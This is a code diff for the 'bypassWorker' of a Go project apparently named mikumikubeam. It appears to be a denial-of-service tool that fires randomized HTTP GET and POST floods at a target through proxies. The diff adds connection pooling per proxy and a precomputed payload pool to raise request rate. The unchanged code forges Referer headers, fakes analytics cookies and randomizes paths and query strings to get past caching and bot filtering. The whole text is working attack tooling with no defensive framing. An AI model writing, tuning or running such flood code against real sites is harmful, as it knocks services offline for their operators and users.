@@ -8,17 +8,33 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync"
 	"time"
 
 	core "github.com/sammwyy/mikumikubeam/internal/engine"
 	"github.com/sammwyy/mikumikubeam/internal/netutil"
 )
 
-type bypassWorker struct{}
+type bypassWorker struct {
+	clients sync.Map // proxy key -> *http.Client (connection pooling)
+}
 
 func NewBypassWorker() *bypassWorker { return &bypassWorker{} }
 
+// getClient returns a cached HTTP client for the given proxy, creating one if needed.
+func (w *bypassWorker) getClient(p core.Proxy) *http.Client {
+	key := proxyKey(p)
+	if c, ok := w.clients.Load(key); ok {
+		return c.(*http.Client)
+	}
+	client := netutil.DialedMimicHTTPClient(p, 6*time.Second, 3)
+	actual, _ := w.clients.LoadOrStore(key, client)
+	return actual.(*http.Client)
+}
+
 func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
+	payloadPoolOnce.Do(initPayloadPool)
+
 	tn := params.TargetNode
 	target := tn.ToURL().String()
 
@@ -31,11 +47,12 @@ func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p cor
 	u.Path = joinURLPath(u.Path, path)
 	q := u.Query()
 	if rand.Intn(2) == 0 {
-		q.Set("_", randomString(8))
+		q.Set("_", payloadPool[rand.Intn(payloadPoolSize)][:8])
 	}
 	u.RawQuery = q.Encode()
 
-	client := netutil.DialedMimicHTTPClient(p, 6*time.Second, 3)
+	// Reuse client per proxy for connection pooling
+	client := w.getClient(p)
 
 	// Prefer GET; sometimes POST small payload
 	useGet := rand.Intn(100) < 80
@@ -43,7 +60,7 @@ func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p cor
 	if useGet {
 		req, err = http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
 	} else {
-		body := bytes.NewBufferString(randomString(minNonZero(params.PacketSize, 256)))
+		body := bytes.NewBufferString(payloadPool[rand.Intn(payloadPoolSize)][:minNonZero(params.PacketSize, 256)])
 		req, err = http.NewRequestWithContext(ctx, http.MethodPost, u.String(), io.NopCloser(body))
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	}
@@ -56,7 +73,7 @@ func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p cor
 		req.Header.Set("Referer", refFor(u))
 	}
 	if rand.Intn(2) == 0 {
-		req.Header.Set("Cookie", "_ga="+randomString(8)+"; _gid="+randomString(8))
+		req.Header.Set("Cookie", "_ga="+payloadPool[rand.Intn(payloadPoolSize)][:8]+"; _gid="+payloadPool[rand.Intn(payloadPoolSize)][:8])
 	}
 
 	resp, err := client.Do(req)
@@ -72,10 +89,10 @@ func (w *bypassWorker) Fire(ctx context.Context, params core.AttackParams, p cor
 func randomPath() string {
 	// choose resource-like paths sometimes
 	exts := []string{"", "", ".js", ".css", ".png", ".jpg", ".svg"}
-	base := randomString(6)
+	base := payloadPool[rand.Intn(payloadPoolSize)][:6]
 	ext := exts[rand.Intn(len(exts))]
 	if rand.Intn(3) == 0 {
-		return base + "/" + randomString(4) + ext
+		return base + "/" + payloadPool[rand.Intn(payloadPoolSize)][:4] + ext
 	}
 	return base + ext
 }
